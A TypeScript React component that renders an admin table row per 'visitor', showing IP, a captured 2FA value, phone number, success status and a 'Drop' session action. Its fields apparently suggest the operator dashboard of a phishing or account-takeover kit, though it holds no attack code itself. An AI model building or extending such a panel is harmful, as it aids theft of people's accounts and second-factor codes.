
import { FC, useState, useContext, useEffect } from "react";
import { observer } from "mobx-react-lite";
import { ctx } from "../..";
import LinkService from "../../services/LinkService";
import m from "./AdminVisitor.module.sass"
import { useQuery } from "../../hooks/useQueryHook";
import { useParams } from "react-router-dom";
import { socket } from "../../websocket/socket";
import Input from "../../component/Input/Input";
import { ILink } from "../../models/ILink";
import { IAdminVisitor } from "../../models/IAdminVisitor";
import AdminService from "../../services/AdminService";
import { ISessionMessage } from "../../models/ISessionMessage";
import Spinner from "../Spinner/Spinner";
import TimestampConditionalRenderer from "../TimestasmpConditionalRenderer/TimestampConditionalRenderer";


interface AdminVisitorProps {
    visitor: IAdminVisitor
    deleteCb: (visitorId: string) => void
    index?: number
}

const AdminVisitor: FC<AdminVisitorProps> = ({index = 0, visitor, deleteCb}) => {

    const {store} = useContext(ctx)
    const [modalActive, setModalActive] = useState<boolean>(false)
    const [messages, setMessages] = useState<ISessionMessage[]>([])
    const [loading, setLoading] = useState<boolean>(false)

    const handleDelete = () => {
        deleteCb(visitor.id)
    }

    const loadSession = async () => {
        setLoading(true)
        try {
            const res: any = await AdminService.getSession(visitor.id)
            if(res.data.json && res.data.json.messages) setMessages(res.data.json.messages)
            setModalActive(true)
        } catch(e) {
            console.error(e)
        }
        setLoading(false)
    }

    const toggleStatus = async () => {
        setLoading(true)
        try {
            const res: any = await AdminService.toggleVisitorStatus(visitor.id)
            if(res.data.json) visitor.success = res.data.json.success
        } catch(e) {
            console.error(e)
        }
        setLoading(false)
    }

    const dropSession = async () => {
        setLoading(true)
        try {
            const res: any = await AdminService.dropSession(visitor.id)
            store.updateLog(200, res.data.msg)
            visitor.dropped = true
        } catch(e) {
            console.error(e) 
        }
        setLoading(false)
    }

    return (
        <>
            <tr className={m.Tr}>
                <td>
                    <div className={`${m.ModalWrapper} ${modalActive && m.Active}`} onClick={() => setModalActive(false)}>
                        <div className={m.Content}>
                            {
                                loading 
                                    ?
                                    <Spinner mini/>
                                    :
                                    messages && messages.length 
                                        ?
                                            messages.map(el => 
                                                <div className={m.Message} key={el.id}>
                                                    {el.message}
                                                </div>
                                            )
                                        :
                                            <p>There are no data</p>
                            }
                        </div>
                    </div>
                    <div className={`${m.Blurer} ${modalActive && m.Active}`} onClick={() => setModalActive(false)}>
                        
                    </div>
                    <span>{index}</span>
                </td>
                <td>
                    {visitor.refer}
                </td>
                <td>
                    {visitor.id}
                </td>
                <td onClick={() => toggleStatus()} style={{cursor: "pointer"}}>
                    {
                        visitor.success 
                            ?                     
                                <span className="mini-badge badge-green badge-btn">
                                    Success
                                </span>
                            : 
                                <span className="mini-badge badge-orange badge-btn">
                                    Pending
                                </span>
                    }
                </td>
                <td>
                    {
                        visitor.success_timestamp
                            ? 
                                visitor.success_timestamp
                            : 
                                <span className="mini-badge badge-orange badge-btn">
                                    Pending
                                </span>
                    }
                </td>
                <td>
                    {
                        visitor.dropped
                            ?                     
                                <span className="mini-badge badge-green badge-btn">
                                    Dropped
                                </span>
                            : 
                                <span className="mini-badge badge-orange badge-btn">
                                    Not yet
                                </span>
                    }
                </td>
                <td>
                    {visitor.ip}
                </td>
                <td>
                    {visitor.twofa ? visitor.twofa : "Empty"}
                </td>
                <td>
                    {visitor.phone ? visitor.phone : "Waiting..."}
                </td>
                <td>
                    <div className={m.TdContent}>
                        <button className="mini-badge badge-green badge-btn" onClick={() => loadSession()}>
                            Load
                        </button>
                        {!visitor.dropped && 
                            <TimestampConditionalRenderer 
                                timestamp={visitor.success_timestamp} 
                                Before={<></>} 
                                After={                        
                                    <button className="mini-badge badge-green badge-btn" onClick={() => dropSession()}>
                                        Drop
                                    </button>
                                }
                            />
                        }

                        <button className="mini-badge badge-red badge-btn" onClick={() => handleDelete()}>
                            Delete
                        </button>
                    </div>
                </td>
            </tr>
        </>
    )
}

export default observer(AdminVisitor)